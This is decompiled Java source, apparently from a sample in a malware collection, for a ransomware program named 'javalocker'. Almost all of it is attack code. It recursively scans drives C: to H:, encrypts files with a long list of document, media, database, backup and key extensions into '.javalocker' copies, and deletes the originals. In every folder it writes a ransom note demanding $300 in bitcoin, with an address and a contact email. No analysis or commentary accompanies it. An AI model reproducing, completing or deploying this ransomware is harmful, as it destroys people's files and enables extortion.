/*     */ package javabasic;
/*     */ 
/*     */ import java.io.BufferedReader;
/*     */ import java.io.File;
/*     */ import java.io.FileReader;
/*     */ import java.io.FileWriter;
/*     */ import java.io.IOException;
/*     */ import java.io.Writer;
/*     */ import java.util.Arrays;
/*     */ import java.util.LinkedList;
/*     */ import java.util.Scanner;
/*     */ import java.util.regex.Matcher;
/*     */ import java.util.regex.Pattern;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class JAVABASIC
/*     */ {
/*  36 */   public static Encryption enf = new Encryption();
/*     */   
/*     */   private static String findexname(String filename) {
/*  39 */     String pa = "\\.[^\\.]*$";
/*  40 */     Pattern p = Pattern.compile(pa);
/*  41 */     Matcher mc = p.matcher(filename);
/*  42 */     boolean bl = mc.find();
/*  43 */     if (!bl)
/*     */     {
/*  45 */       return ".";
/*     */     }
/*  47 */     int s = mc.start();
/*  48 */     int e = mc.end();
/*  49 */     int j = 0;
/*  50 */     StringBuilder bu = new StringBuilder();
/*  51 */     for (int i = s; i < e; i++)
/*     */     {
/*  53 */       bu.append(filename.charAt(i));
/*     */     }
/*  55 */     return bu.toString();
/*     */   }
/*     */   public static String readFileContent(String fileName) {
/*  58 */     File file = new File(fileName);
/*  59 */     BufferedReader reader = null;
/*  60 */     StringBuffer sbf = new StringBuffer();
/*     */     try {
/*  62 */       reader = new BufferedReader(new FileReader(file));
/*     */       String tempStr;
/*  64 */       while ((tempStr = reader.readLine()) != null) {
/*  65 */         sbf.append(tempStr);
/*     */       }
/*  67 */       reader.close();
/*  68 */       return sbf.toString();
/*  69 */     } catch (IOException iOException) {
/*     */ 
/*     */     
/*     */     } finally {
/*  73 */       if (reader != null) {
/*     */         try {
/*  75 */           reader.close();
/*  76 */         } catch (IOException iOException) {}
/*     */       }
/*     */     } 
/*     */ 
/*     */ 
/*     */     
/*  82 */     return sbf.toString();
/*     */   }
/*     */   public static boolean rename(File file, String newName) {
/*  85 */     if (file == null) return false; 
/*  86 */     if (!file.exists()) return false; 
/*  87 */     if (newName.equals(file.getName())) return true; 
/*  88 */     File newFile = new File(file.getParent() + File.separator + newName);
/*  89 */     return (!newFile.exists() && file
/*  90 */       .renameTo(newFile));
/*     */   }
/*     */   
/*     */   public static void tryencrpt(String p) {
/*  94 */     String[] type = { ".accdb", ".pub", ".reg", ".ico", ".mui", ".onetoc2", ".dwg", ".wk1", ".wks", ".vsdx", ".vsd", ".eml", ".msg", ".ost", ".pst", ".pptx", ".jfif", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".ost", ".msg", ".eml", ".vsd", ".txt", ".csv", ".rtf", ".123", ".wks", ".pdf", ".dwg", ".onetoc2", ".snt", ".snt", ".jpeg", ".jpg", ".docb", ".docm", ".zip", ".7z", ".rar", ".mp4", ".wav", ".mp3", ".cpp", ".gho", ".iso", ".mui", ".flv", ".wma", ".key", ".sln", ".vbs", ".bat", ".cs", ".ini", ".cmd", ".lv", ".c", ".js", ".php", ".mp4", ".html", ".py", ".docb", ".pps", ".gz", ".gpg", ".xlsm", ".vmdk", ".vmx", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".vdi", ".aes", ".arc", ".paq", ".bz2", ".tbk", ".bak", ".tar", ".gz", ".backup", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".3g2", ".mkv", ".3gp", ".mov", ".avi", ".asf", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".sh", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".dp", ".vb", ".vbs", ".ps1", ".asm", ".h", ".pas", ".suo", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".obd", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".pfx", ".der" };
/*  95 */     String res = findexname(p);
/*  96 */     res.trim();
/*  97 */     for (String s : type) {
/*     */       
/*  99 */       if (res.compareToIgnoreCase(s) == 0) {
/*     */         
/* 101 */         Writer out = null;
/* 102 */         String con = readFileContent(p);
/*     */         try {
/* 104 */           key.main(p, p + ".javalocker");
/* 105 */         } catch (Exception exception) {}
/*     */ 
/*     */         
/* 108 */         File f = new File(p);
/* 109 */         if (f.canWrite())
/* 110 */           f.delete(); 
/*     */       } 
/*     */     } 
/*     */   }
/*     */   public static void folderMethod1(String path) {
/* 115 */     int fileNum = 0, folderNum = 0;
/* 116 */     File file = new File(path);
/* 117 */     LinkedList<File> list = new LinkedList<>();
/* 118 */     if (file.exists()) {
/* 119 */       if (null == file.listFiles()) {
/*     */         return;
/*     */       }
/* 122 */       list.addAll(Arrays.asList(file.listFiles()));
/* 123 */       while (!list.isEmpty()) {
/* 124 */         File[] files = ((File)list.removeFirst()).listFiles();
/* 125 */         if (null == files) {
/*     */           continue;
/*     */         }
/* 128 */         for (File f : files) {
/* 129 */           if (f.isDirectory() && !f.getAbsolutePath().startsWith("C:\\Windows")) {
/*     */             
/* 131 */             File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
/*     */             
/*     */             try {
/* 134 */               fj.createNewFile();
/* 135 */               if (fj.canWrite())
/*     */               {
/* 137 */                 Writer out = null;
/* 138 */                 out = new FileWriter(fj);
/* 139 */                 String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
/* 140 */                 out.write(data);
/* 141 */                 out.close();
/*     */               }
/*     */             
/* 144 */             } catch (IOException iOException) {}
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */             
/* 151 */             list.add(f);
/* 152 */             folderNum++;
/*     */           
/*     */           }
/*     */           else {
/*     */             
/* 157 */             if (f.length() < 104857600L) {
/*     */               
/* 159 */               tryencrpt(f.getAbsolutePath());
/* 160 */               File fgf = new File(f.getPath() + "DESkey.dat");
/* 161 */               fgf.delete();
/*     */             } 
/* 163 */             fileNum++;
/*     */           } 
/*     */         } 
/*     */       } 
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public static void find2(String path) {
/* 174 */     File file = new File(path);
/* 175 */     File[] fs = file.listFiles();
/* 176 */     if (fs == null) {
/*     */       return;
/*     */     }
/*     */     
/* 180 */     for (File f : fs) {
/*     */       
/* 182 */       if (!f.isDirectory() && !f.getAbsolutePath().startsWith("C:\\Windows")) {
/*     */         
/* 184 */         if (f.length() < 104857600L)
/*     */         {
/* 186 */           tryencrpt(f.getAbsolutePath());
/*     */         }
/*     */       }
/*     */       else {
/*     */         
/* 191 */         File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
/*     */ 
/*     */         
/*     */         try {
/* 195 */           fj.createNewFile();
/* 196 */           if (fj.canWrite()) {
/*     */             
/* 198 */             Writer out = null;
/* 199 */             out = new FileWriter(fj);
/* 200 */             String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
/* 201 */             out.write(data);
/* 202 */             out.close();
/*     */           } 
/* 204 */         } catch (IOException iOException) {}
/*     */       } 
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public static void ret(File f) {
/* 214 */     File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
/*     */ 
/*     */     
/*     */     try {
/* 218 */       fj.createNewFile();
/* 219 */       if (fj.canWrite()) {
/*     */         
/* 221 */         Writer out = null;
/* 222 */         out = new FileWriter(fj);
/* 223 */         String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
/* 224 */         out.write(data);
/* 225 */         out.close();
/*     */       } 
/* 227 */     } catch (IOException iOException) {}
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public static void main(String[] args) throws IOException, Exception {
/* 234 */     Scanner sc = new Scanner(System.in);
/* 235 */     ret(new File("C:\\"));
/* 236 */     ret(new File("D:\\"));
/* 237 */     ret(new File("E:\\"));
/* 238 */     ret(new File("F:\\"));
/* 239 */     ret(new File("G:\\"));
/* 240 */     ret(new File("H:\\"));
/* 241 */     find2("D:\\");
/* 242 */     folderMethod1("D:\\");
/* 243 */     find2("E:\\");
/* 244 */     folderMethod1("E:\\");
/* 245 */     find2("F:\\");
/* 246 */     folderMethod1("F:\\");
/* 247 */     find2("G:\\");
/* 248 */     folderMethod1("G:\\");
/* 249 */     find2("H:\\");
/* 250 */     folderMethod1("H:\\");
/* 251 */     find2("C:\\");
/* 252 */     folderMethod1("C:\\");
/*     */   }
/*     */ }


/* Location:              C:\Users\Java\Desktop\malwares\JAVABASIC.jar!\javabasic\JAVABASIC.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */